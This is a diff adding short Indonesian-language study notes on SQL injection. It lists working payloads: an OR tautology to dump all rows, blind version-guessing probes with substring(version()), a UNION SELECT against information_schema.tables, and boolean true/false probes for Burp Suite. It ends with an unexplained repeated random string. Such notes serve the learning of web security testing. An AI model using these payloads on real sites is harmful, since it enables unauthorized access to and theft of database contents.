@@ -1,0 +1,14 @@
+'OR'1'='1' # ini akan diterima karena ada kondisi OR yg akan membuat eksekusi nya TRUE, dan ini bisa mengeluarkan semua data dari database web app nya ini 
+
+untuk mendapatkan data dari databasenya sendiri - yaitu mengira ngira salah satu cara ngira ngira nya dengan memakai 
+'and substring(version(),1,1)=5# 
+hanya bisa melihat ada kembalian atau tidak kalau tidak ada eror kalau ada berarti true
+'and substring(version(),1,1)=6# 
+
+'union+select+table_name,NULL+from+information_schema.tables--
+
+Single code yang digunakan untuk menutup statement di Burpsuite
+' and 2=2--
+' and 2=1--
+
+rTdxLWg0rn8ubvt4YQVFpBiRfdONrAcLL94ZPwtkh86 rTdxLWg0rn8ubvt4YQVFpBiRfdONrAcLL94ZPwtkh86 
